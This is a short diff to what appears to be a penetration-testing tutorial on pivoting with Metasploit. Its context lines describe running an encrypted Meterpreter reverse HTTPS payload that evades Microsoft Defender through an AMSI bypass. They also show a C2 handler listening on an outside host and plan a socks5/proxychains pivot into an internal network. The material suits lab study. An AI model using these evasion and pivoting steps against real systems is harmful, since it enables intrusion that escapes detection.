@@ -108,7 +108,7 @@ HandlerSSLCert => /home/jeff/Documents/Tools/Pivoting-with-MSF/pentest.pem
 
 
 ===========================================================================================================================================
-Step 2 - Run the Meterpreter payload (reverse HTTPS) on the Windows 10 laptop with Defender AV enabled and up-to-date
+Step 2 - Run the Meterpreter payload (reverse HTTPS) on the Windows 10 laptop (with Defender AV enabled and up-to-date)
 ===========================================================================================================================================
 
 Note: By generating an encrypted meterpreter payload and using an AMSI bypass, our payload is not detected nor blocked by the Microsoft Defender AV running on the Windows target.
@@ -129,9 +129,9 @@ PS C:\Users\Administrator\Documents\Tools-AD> .\reversehttps.exe
 PS C:\Users\Administrator\Documents\Tools-AD>
 
 
-==============================================================================================================================================================
-Step 3 - Configure the meterpreter handler (C2 server) to pivot into the internal network (192.168.1.0/24) using a proxy socks5 and Proxychains
-==============================================================================================================================================================
+=========================================================================================================================================================================
+Step 3 - Configure the meterpreter handler (C2 server) to pivot into the internal network (192.168.1.0/24) using a proxy socks5 and Proxychains (+ msf autoroute command)
+=========================================================================================================================================================================
 
 [*] Started HTTPS reverse handler on https://192.168.56.104:443
 
